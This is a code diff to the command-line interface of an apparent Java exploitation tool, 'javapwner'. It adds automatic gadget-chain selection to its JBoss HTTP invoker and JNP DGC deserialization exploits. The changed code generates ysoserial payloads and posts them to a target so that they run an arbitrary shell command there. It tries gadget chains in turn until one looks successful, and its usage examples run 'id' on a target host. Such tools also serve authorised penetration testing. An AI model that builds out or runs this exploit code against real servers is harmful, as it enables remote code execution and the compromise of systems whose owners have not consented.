@@ -152,8 +152,9 @@ def scan_cmd(
 @jboss.command("exploit")
 @click.option("-t", "--target", required=True, metavar="HOST")
 @click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
-@click.option("--gadget", required=True, metavar="NAME",
-              help="ysoserial gadget chain name (e.g. CommonsCollections1).")
+@click.option("--gadget", required=False, default=None, metavar="NAME",
+              help="ysoserial gadget chain name (e.g. CommonsCollections1). "
+                   "Auto-detected if omitted.")
 @click.option("--cmd", "command", required=True, metavar="CMD",
               help="Shell command to execute on the target.")
 @click.option("--path", "invoker_path", default=None, metavar="PATH",
@@ -165,7 +166,7 @@ def exploit_cmd(
     ctx: click.Context,
     target: str,
     port: int,
-    gadget: str,
+    gadget: str | None,
     command: str,
     invoker_path: str | None,
     use_https: bool,
@@ -175,6 +176,9 @@ def exploit_cmd(
     Posts a raw serialised Java object to the JBoss HTTP invoker endpoint.
     The server deserialises the body and executes the embedded gadget chain.
 
+    When --gadget is omitted the tool tries gadgets in priority order and
+    stops on the first one that produces a likely_success response.
+
     \b
     Classic gadget chains for JBoss:
       CommonsCollections1  — JBoss 4.x / JDK ≤ 7
@@ -182,6 +186,7 @@ def exploit_cmd(
 
     \b
     Examples:
+      javapwner jboss exploit -t 10.0.0.5 --cmd 'id'
       javapwner jboss exploit -t 10.0.0.5 --gadget CommonsCollections1 --cmd 'id'
       javapwner jboss exploit -t 10.0.0.5 --gadget CommonsCollections6 --cmd 'id' \\
                               --path /invoker/readonly
@@ -190,36 +195,53 @@ def exploit_cmd(
     timeout = _get_timeout(ctx)
     jar = _get_ysoserial(ctx)
 
-    try:
-        from javapwner.core.payload import YsoserialWrapper
-        wrapper = YsoserialWrapper(jar_path=jar)
-        payload = wrapper.generate(gadget, command)
-    except PayloadError as exc:
-        fmt.error(str(exc))
-        sys.exit(1)
-
     invoker = HttpInvoker(timeout=timeout, scheme="https" if use_https else "http")
 
-    fmt.info(
-        f"Exploiting {target}:{port} via HTTP invoker "
-        f"with gadget '{gadget}' → {command!r}"
-    )
-
-    try:
-        result = invoker.exploit(target, port, payload, path=invoker_path)
-    except JavaPwnerError as exc:
-        fmt.error(str(exc))
-        sys.exit(1)
+    if gadget is None:
+        fmt.info(
+            f"No gadget specified — trying gadgets in priority order on {target}:{port}…"
+        )
+        with fmt.status("Finding compatible gadget…"):
+            used, result = invoker.auto_exploit(
+                target, port, command, path=invoker_path, jar_path=jar
+            )
+        if used:
+            fmt.info(f"Using gadget: {used}")
+        else:
+            fmt.error(
+                f"No gadget produced a successful response on {target}:{port}. "
+                "Verify the target is reachable and CommonsCollections is in its classpath."
+            )
+            if fmt.json_mode:
+                fmt.print_json(result.to_dict())
+            sys.exit(1)
+    else:
+        fmt.info(
+            f"Exploiting {target}:{port} via HTTP invoker "
+            f"with gadget '{gadget}' → {command!r}"
+        )
+        try:
+            from javapwner.core.payload import YsoserialWrapper
+            wrapper = YsoserialWrapper(jar_path=jar)
+            payload = wrapper.generate(gadget, command)
+        except PayloadError as exc:
+            fmt.error(str(exc))
+            sys.exit(1)
+        try:
+            result = invoker.exploit(target, port, payload, path=invoker_path)
+        except JavaPwnerError as exc:
+            fmt.error(str(exc))
+            sys.exit(1)
 
     if fmt.json_mode:
         fmt.print_json(result.to_dict())
         return
 
-    if result.error:
+    if result.error and not result.sent:
         fmt.error(f"Exploit failed: {result.error}")
         sys.exit(1)
 
-    fmt.info(f"  Endpoint : {result.endpoint}")
+    fmt.info(f"  Endpoint    : {result.endpoint}")
     fmt.info(f"  HTTP status : {result.http_status}")
 
     if result.likely_success:
@@ -297,18 +319,22 @@ def jnp_scan_cmd(ctx: click.Context, target: str, port: int) -> None:
               help="Target hostname or IP address.")
 @click.option("-p", "--port", default=4444, show_default=True, type=int,
               metavar="PORT", help="TCP port of the JNP service.")
-@click.option("--gadget", required=True, metavar="NAME",
-              help="ysoserial gadget chain (e.g. CommonsCollections1).")
+@click.option("--gadget", required=False, default=None, metavar="NAME",
+              help="ysoserial gadget chain (e.g. CommonsCollections1). "
+                   "Auto-detected if omitted.")
 @click.option("--cmd", "command", required=True, metavar="CMD",
               help="Shell command to execute on the target.")
 @click.pass_context
 def jnp_exploit_cmd(
-    ctx: click.Context, target: str, port: int, gadget: str, command: str
+    ctx: click.Context, target: str, port: int, gadget: str | None, command: str
 ) -> None:
     """Deliver a ysoserial payload via JBoss JNP DGC dirty().
 
     JNP runs on standard JRMP — the DGC endpoint is always present and
     deserialises without JEP 290 filtering on JBoss AS 4.x–6.x.
+
+    When --gadget is omitted the tool tries gadgets in priority order and
+    stops on the first one that produces a likely_success response.
 
     \b
     Classic gadgets:
@@ -317,34 +343,44 @@ def jnp_exploit_cmd(
 
     \b
     Examples:
+      javapwner jboss jnp-exploit -t 10.0.0.5 --cmd 'id'
       javapwner jboss jnp-exploit -t 10.0.0.5 --gadget CommonsCollections1 --cmd 'id'
     """
     fmt = _get_fmt(ctx)
     timeout = _get_timeout(ctx)
     jar = _get_ysoserial(ctx)
 
-    try:
-        from javapwner.core.payload import YsoserialWrapper
-        wrapper = YsoserialWrapper(jar_path=jar)
-        payload = wrapper.generate(gadget, command)
-    except PayloadError as exc:
-        fmt.error(str(exc))
-        sys.exit(1)
+    exploiter = JnpExploiter(timeout=timeout, jar_path=jar)
 
-    exploiter = JnpExploiter(timeout=timeout)
-    fmt.info(f"Exploiting {target}:{port} via JNP DGC with gadget '{gadget}' → {command!r}")
-
-    try:
-        result = exploiter.exploit(target, port, payload)
-    except JavaPwnerError as exc:
-        fmt.error(str(exc))
-        sys.exit(1)
+    if gadget is None:
+        fmt.info(
+            f"No gadget specified — trying gadgets in priority order on {target}:{port}…"
+        )
+        with fmt.status("Finding compatible gadget…"):
+            used, result = exploiter.auto_exploit(target, port, command, jar_path=jar)
+        if used:
+            fmt.info(f"Using gadget: {used}")
+        else:
+            fmt.error(
+                f"No gadget produced a successful response on {target}:{port}. "
+                "Verify the target is reachable and the classpath contains a supported library."
+            )
+            if fmt.json_mode:
+                fmt.print_json(result.to_dict())
+            sys.exit(1)
+    else:
+        fmt.info(f"Exploiting {target}:{port} via JNP DGC with gadget '{gadget}' → {command!r}")
+        try:
+            result = exploiter.exploit_gadget(target, port, gadget, command)
+        except JavaPwnerError as exc:
+            fmt.error(str(exc))
+            sys.exit(1)
 
     if fmt.json_mode:
         fmt.print_json(result.to_dict())
         return
 
-    if result.error:
+    if result.error and not result.sent:
         fmt.error(f"Exploit failed: {result.error}")
         sys.exit(1)
 
